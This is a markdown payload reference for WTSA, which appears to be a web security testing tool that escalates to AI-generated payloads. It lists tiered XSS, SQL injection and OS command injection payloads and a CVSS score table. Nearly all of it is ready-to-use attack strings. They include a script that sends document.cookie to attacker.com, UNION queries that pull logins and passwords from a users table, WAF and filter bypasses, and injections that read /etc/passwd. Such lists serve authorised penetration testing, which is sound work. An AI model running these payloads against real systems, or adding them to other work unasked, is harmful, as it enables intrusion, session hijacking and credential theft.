# WTSA — Sample Payload Reference

A reference of payloads built into WTSA's static library, organised by attack type and tier.
WTSA escalates through these tiers before writing AI-generated custom payloads.

> ⚠️ For authorised security testing only.

---

## XSS Payloads

### Tier 1 — Broad applicability
```
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
<svg onload=alert(1)>
'><script>alert(1)</script>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<script>alert(document.cookie)</script>
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

### Tier 2 — WAF bypass, encoding variants
```
<svg/onload=alert(1)>
"><ScRiPt>alert(1)</sCrIpT>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
javascript://%0aalert(1)
${alert(1)}
{{constructor.constructor('alert(1)')()}}
<scr\x00ipt>alert(1)</scr\x00ipt>
JaVaScRiPt:alert(1)
```

### Tier 3 — Exotic, mutation-based
```
\u003cscript\u003ealert(1)\u003c/script\u003e
%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<iframe srcdoc="<script>parent.alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
```

---

## SQL Injection Payloads

### Tier 1 — Universal probes
```
'
''
`
"
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
' OR 1=1--
' OR 1=1#
') OR ('1'='1
```

### Tier 2 — MySQL specific
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
blah' union select 1,DATABASE(),3,4,5,6--
blah' union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema=database()--
blah' union select 1,login,password,email,secret,7 from users--
1 AND SLEEP(5)
1 AND SLEEP(5)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
```

### Tier 2 — PostgreSQL specific
```
'; SELECT pg_sleep(5)--
1; SELECT pg_sleep(5)--
' UNION SELECT NULL,NULL--
' AND 1=CAST((SELECT version()) AS INT)--
```

### Tier 2 — MSSQL specific
```
'; WAITFOR DELAY '0:0:5'--
1; WAITFOR DELAY '0:0:5'--
' UNION SELECT NULL,NULL--
' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

### Tier 2 — SQLite specific
```
' UNION SELECT NULL--
'; SELECT sqlite_version()--
1 AND randomblob(100000000/1)
```

### Boolean blind pairs (true / false)
```
' AND '1'='1    →  ' AND '1'='2
' AND 1=1--     →  ' AND 1=2--
1 AND 1=1       →  1 AND 1=2
```

### Time-based blind templates
```
MySQL:      1 AND SLEEP({delay})
PostgreSQL: 1; SELECT pg_sleep({delay})
MSSQL:      1; WAITFOR DELAY '0:0:{delay}'
SQLite:     1 AND randomblob({delay * 10000000})
```

### Tier 3 — WAF bypass variants
```
' /*!UNION*/ /*!SELECT*/ NULL--
' UN/**/ION SEL/**/ECT NULL--
'+UNION+SELECT+NULL--
```

---

## OS Command Injection Payloads

### Tier 1 — Linux
```
; id
| id
&& id
|| id
$(id)
; whoami
| whoami
&& whoami
; cat /etc/passwd
; uname -a
; id; whoami; uname -a; cat /etc/passwd
```

### Tier 1 — Windows
```
& whoami
| whoami
&& whoami
|| whoami
& dir
| dir
& ipconfig
```

### Tier 1 — Cross-platform
```
; id
| id
&& id
|| id
$(id)
; whoami
& whoami
| whoami
```

### Blind timing probes
```
Linux:   ; sleep 5
Linux:   ; ping -c 5 127.0.0.1
Windows: & ping -n 5 127.0.0.1
Any:     $(sleep 5)
```

### Tier 2 — Whitespace / filter bypass
```
;{IFS}id
|{IFS}id
%0aid
%0a id
;i\d
;$(printf 'id')
```

---

## CVSS Quick Reference

| Vulnerability Type | CVSS Base Score | Vector |
|---|---|---|
| SQLi - Classic | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| CMDi | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| SQLi - Blind Boolean | 8.8 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| SQLi - Blind Time | 7.5 | AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |
| XSS - Stored | 8.8 | AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N |
| SSRF | 8.6 | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N |
| XXE | 8.2 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L |
| XSS - Reflected | 6.1 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| XSS - DOM | 6.1 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| CSRF | 6.5 | AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N |
